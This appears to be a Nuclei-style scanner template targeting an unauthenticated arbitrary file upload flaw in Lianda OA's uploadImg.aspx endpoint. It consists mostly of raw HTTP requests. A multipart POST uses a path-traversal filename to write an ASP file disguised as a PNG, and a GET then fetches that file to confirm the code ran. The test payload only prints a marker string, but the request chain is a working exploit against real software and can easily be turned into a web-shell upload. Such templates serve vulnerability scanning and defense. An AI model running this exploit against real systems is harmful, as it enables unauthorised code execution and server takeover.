id: liandaoa-uploadImg2-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 联达OA uploadImg.aspx 接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://github.com/wy876/POC/commit/17fce9e8a8e4c711753f586f24a2b8351f367aee#diff-22dbce025bff1905cb3664aea0fd2c29aa6f345a6f706e8c9cd769e4a4b2f89dR3
  tags: tags

variables:
  filename: "{{rand_base(6)}}" 
  
http:
  - raw:
      - |
        POST /Hosp_Portal/uploadImg.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
        Content-Type: multipart/form-data; boundary=--00content0boundary00
        Accept: text/html, image/gif, image/jpeg, */*; q=.2, */*; q=.2
        Connection: close
        Content-Length: 278

        ----00content0boundary00
        Content-Disposition: form-data; name="DesignId"

        1
        ----00content0boundary00
        Content-Disposition: form-data; name="Filedata"; filename="../../../../{{filename}}.asp"
        Content-Type: image/png

        <% Response.Write("whoisceshi") %>
        ----00content0boundary00--
      - |+
        GET /{{filename}}.asp HTTP/1.1
        Host: {{Hostname}}
        accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
